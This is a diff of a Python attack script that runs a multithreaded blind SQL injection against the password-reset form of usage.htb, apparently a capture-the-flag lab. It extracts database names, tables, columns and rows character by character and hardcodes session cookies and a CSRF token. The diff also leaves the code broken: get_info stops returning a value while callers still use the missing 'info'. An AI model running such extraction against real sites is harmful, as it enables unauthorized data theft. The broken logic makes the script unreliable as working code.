@@ -7,6 +7,8 @@ import time
 import os
 import re
 import math
+import threading
+import copy
 from pwn import *
 
 
@@ -22,6 +24,12 @@ class Color:
     BLACK = "\033[1;30;48m"
     UNDERLINE = "\033[4;37;48m"
     END = "\033[1;37;0m"
+
+
+class WrapperResponse:
+    def __init__(self, text, character):
+        self.text = text
+        self.character = character
 
 
 class DB:
@@ -53,18 +61,19 @@ signal.signal(signal.SIGINT, ctrlC)
 main_url = "http://usage.htb/forget-password"
 method = "POST"
 headers = {
-    "Cookie": "XSRF-TOKEN=eyJpdiI6InB5Qnd1Y1FGL25xdVJzSFVPVG04SGc9PSIsInZhbHVlIjoiNFA3QUFSd1hWYURxZ0I4WkM2YmRKZEMvWXpUdkt3UUxKUlpnczdaaHhic3ROYThtNm5ERXZ4VDZ5ZUhqaVBDa3ZMeUt3U0EwLzViVzRNM0xhRzRvdXR3V2J6bkZBanpyOFVUazFsQ0NwblQwL0FHS3plamlGK3pPVFM3TGpJZ2oiLCJtYWMiOiIzMjhiMDc3OTAyYzk0NGE0M2RkMDlkNzhhZGIwYjVlNjNkMTZiNDE1ZjUxNDEwZGFkZTBiYzk3MGNjNTUwNGE1IiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6IjU2ekl4ejdUT1dsN0w3dUdEU0t4UHc9PSIsInZhbHVlIjoic2JsaUtGSnFuNWZmeElFdEtMLzFxTDlGU08wWVppSmw3MkJWTWgrQ1Z6T0trR2RYbFVFekFzMGJ3WHJILysrVHZoaDUvYS9PWmZiaVBMQnBVRGRQaEVGbzE5VzFTemNYNEVFejBIdFlSdS9YT01PY0FyN01OdzBRNjdsRVNUNGYiLCJtYWMiOiI4YTAzYjdiZGJjM2JjOWE4MjRhMzJkYzk5NjZkMDY4MWM1MWUyMWY4YmIyYmUzNGM0MzRkODkwMjczYTc1ZTBkIiwidGFnIjoiIn0%3D"
+    "Cookie": "XSRF-TOKEN=eyJpdiI6Ikd0eTJCRnJ6S2VTYkszVkJqdUl6dXc9PSIsInZhbHVlIjoiMHk5Yy8xMnpjR2hFWndPeDB5UzhCN2N2YVhGK1dBOWhPZG5rRUdKdnNRMTd2aUdLcXNYOU13ckI5MTBNZXJDMHFiVTl3YTNqalQ5Z20xaVB6cjBqMDdnSDZmVmx2SnpkNEw3UWtjSzhHT0VIZDZnbi9XZHhhYnVXVGM3YndjRGwiLCJtYWMiOiJiYzU5NjVmYWI1YzMyMmMxNjU2MWZmMTU1YjU5ZDhmZjc4OGEwOWY0MjI5ZjhkYTQ3M2U3YmE2NjYyNjk5NjVmIiwidGFnIjoiIn0%3D; laravel_session=eyJpdiI6InZiRU9DUHlKNGM4QUxmUUl2bWpNb2c9PSIsInZhbHVlIjoiSVZmQ2NObU9WU251dnVpeEMxVXY5U20vWnZwUWVMM2JWc3JrcGlIT0dSeE96TzNGUHBGUlV5V3Z6bWFTeW51Z0RVa3BWb0lvMUM4YndVQVdYSkR0ZXJRdlJhSHpwNUxDOFZoRTNDWmJkZ3Z3c3NXYUFDQzBoL3E0SmtSNWxWNW8iLCJtYWMiOiJhNzc1NDMxNDk5NzgyYjliY2QxMmM0OGFiZjlmN2MwZTkxZjFkZTk0OTk2ZDIxYTc2NGMzMWJlMmI4NTI2ZjkzIiwidGFnIjoiIn0%3D"
 }
 post_data = {
-    "_token": "KNS5mPkU83fcoFpTTJHiQSbWx2Nka9QBWUJK1rLG",
+    "_token": "uvmUnrDZgvdzPLynmIahMEaUlsV16Ctha9P4np03",
     "email": "test@gmail.com",
 }
 post_data_exploit = "email"
 get_data = ""
 condition = "We have e-mailed your password reset link to"
-num_threads = 10
+num_threads = 5
 dbs = []
 threads = []
+responses = []
 
 
 # Functions
@@ -86,36 +95,57 @@ def set_payload(exploit, position, character, db, table):
     return result
 
 
+def send_request(data, character):
+
+    response = requests.post(main_url, headers=headers, data=data)
+    responses.append(WrapperResponse(response.text, character))
+
+
 def get_info(label_info, label_menu, info_name, db=None, table=None):
+
     info = ""
     position = 1
-    initial_value = post_data[post_data_exploit]
 
     while True:
-
+        characters = list(reversed(range(33, 127)))
         notFindCharacters = True
 
-        for character in range(33, 126):
+        while notFindCharacters and len(characters) != 0:
 
-            payload = (
-                f"{initial_value}{set_payload(info_name,position,character, db, table)}"
-            )
-            post_data[post_data_exploit] = payload
+            for _ in range(num_threads):
 
-            label_menu.status(payload)
-            response = requests.post(main_url, headers=headers, data=post_data)
+                if len(characters) == 0 or not notFindCharacters:
+                    break
 
-            if condition in response.text:
-                info += chr(character)
-                label_info.status(f"{Color.GREEN}{info}{Color.END}")
-                notFindCharacters = False
-                break
+                character = characters.pop()
+                payload = f"{post_data[post_data_exploit]}{set_payload(info_name,position,character, db, table)}"
+                data = copy.copy(post_data)
+                data[post_data_exploit] = payload
+
+                label_menu.status(f"position: {position}, character: {character}")
+
+                thread = threading.Thread(
+                    target=send_request,
+                    args=(data, character),
+                )
+                threads.append(thread)
+                thread.start()
+
+            for thread in threads:
+                thread.join()
+
+            for response in responses:
+                if condition in response.text:
+                    print(f"find character: {response.character}")
+                    info += str(response.character)
+                    label_info.status(f"{Color.GREEN}{info}{Color.END}")
+                    notFindCharacters = False
+                    responses.clear()
+                    break
 
         position += 1
         if notFindCharacters:
             break
-
-    return info
 
 
 def get_user(label_menu):
@@ -127,7 +157,7 @@ def get_dbs(label_menu):
     global dbs
 
     label_info = log.progress(Color.YELLOW + "DBs" + Color.END)
-    info = get_info(label_info, label_menu, "DBs")
+    get_info(label_info, label_menu, "DBs")
 
     new_dbs = info.split(",")
     for db_name in new_dbs:
@@ -145,7 +175,7 @@ def get_tables(label_menu):
         label_info = log.progress(
             f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Tables{Color.END}"
         )
-        info = get_info(label_info, label_menu, "Tables", db)
+        get_info(label_info, label_menu, "Tables", db)
 
         new_tables = info.split(",")
         for table_name in new_tables:
@@ -165,7 +195,7 @@ def get_columns(label_menu):
             label_info = log.progress(
                 f"{Color.YELLOW}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Columns{Color.END}"
             )
-            info = get_info(label_info, label_menu, "Columns", db, table)
+            get_info(label_info, label_menu, "Columns", db, table)
 
             new_columns = info.split(",")
             for column_name in new_columns:
@@ -185,7 +215,7 @@ def get_rows(label_menu):
                 f"{Color.BOLD}DB{Color.END}:{Color.PURPLE}{db.name}{Color.END} {Color.YELLOW}Table{Color.END}:{Color.CYAN}{table.name}{Color.END} {Color.YELLOW}Rows{Color.END}"
             )
 
-            info = get_info(label_info, label_menu, "Rows", db, table)
+            get_info(label_info, label_menu, "Rows", db, table)
 
             new_rows = info.split(",")
             for row in new_rows:
